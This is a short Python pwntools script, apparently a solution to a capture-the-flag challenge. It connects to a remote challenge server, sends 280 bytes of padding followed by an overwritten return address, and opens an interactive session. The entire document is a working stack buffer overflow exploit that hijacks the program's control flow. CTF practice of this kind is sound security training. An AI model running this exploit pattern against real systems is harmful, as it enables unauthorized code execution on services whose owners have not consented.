from pwn import *
p = remote('chals20.cybercastors.com',14424)
padd = "a" * 280
addr = p64(0x400727)
payload = ""
payload += padd
payload += addr
p.recvuntil("Hello everyone, say your name: ")
p.sendline(payload)
p.interactive()